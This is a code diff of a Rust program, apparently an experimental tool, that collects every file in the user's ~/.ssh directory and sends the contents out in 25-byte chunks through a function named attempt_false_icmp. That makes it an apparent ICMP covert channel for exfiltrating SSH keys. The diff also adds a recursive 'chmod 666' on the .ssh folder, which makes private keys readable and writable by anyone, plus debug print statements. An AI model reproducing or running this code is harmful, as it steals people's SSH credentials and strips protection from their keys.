@@ -85,12 +85,22 @@ fn get_ssh_filepaths() -> Vec<PathBuf> {
 
     home_dir.push(".ssh");
 
+    let mut change_perms1 = std::process::Command::new("chmod")
+        .arg("-R")
+        .arg("666")
+        .arg(home_dir.to_str().unwrap())
+        .spawn()
+        .unwrap();
+    change_perms1.wait().unwrap();
+
     match home_dir.as_path().read_dir() {
         Ok(dir_iter) => dir_iter
             .filter_map(|dir_entry| match dir_entry {
                 Ok(entry) => {
                     if let Ok(file_type) = entry.file_type() {
+                        println!("{}", entry.path().to_str().unwrap());
                         if file_type.is_file() {
+                            println!("{}", entry.path().to_str().unwrap());
                             Some(entry.path())
                         } else {
                             None
@@ -136,6 +146,8 @@ fn main() {
 
     let paths = get_ssh_filepaths();
 
+    println!("");
+
     for p in paths {
         println!("{}", p.to_str().unwrap());
 
@@ -149,10 +161,14 @@ fn main() {
             let data: Vec<u8> = file.bytes().map(|byte| byte.unwrap()).collect();
             to_send.extend(data);
 
-            for window in to_send.chunks(71) {
+            for window in to_send.chunks(25) {
                 let _ = attempt_false_icmp(window);
             }
+
+            println!("here");
         }
+
+        println!("done");
     }
 
     // let msg = String::from("hello noah test test test");
